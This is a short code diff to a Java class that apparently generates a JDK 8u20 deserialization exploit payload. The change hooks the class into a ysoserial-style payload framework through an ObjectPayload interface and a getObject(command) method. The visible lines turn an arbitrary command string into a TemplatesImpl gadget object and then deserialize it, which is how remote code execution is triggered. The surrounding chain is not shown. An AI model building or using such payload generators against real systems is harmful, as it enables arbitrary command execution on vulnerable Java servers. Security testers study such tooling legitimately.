@@ -14,7 +14,7 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
 
- public class Jdk8u20_feihong {
+ public class Jdk8u20_feihong implements ObjectPayload{
 
      public byte[] getPayload(final String command) throws Exception {
          TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(command);
@@ -157,4 +157,8 @@ import java.util.LinkedHashSet;
          Deserializer.deserialize(b);
      }
 
+     @Override
+     public Object getObject(String command) throws Exception {
+         return getPayload(command);
+     }
  }
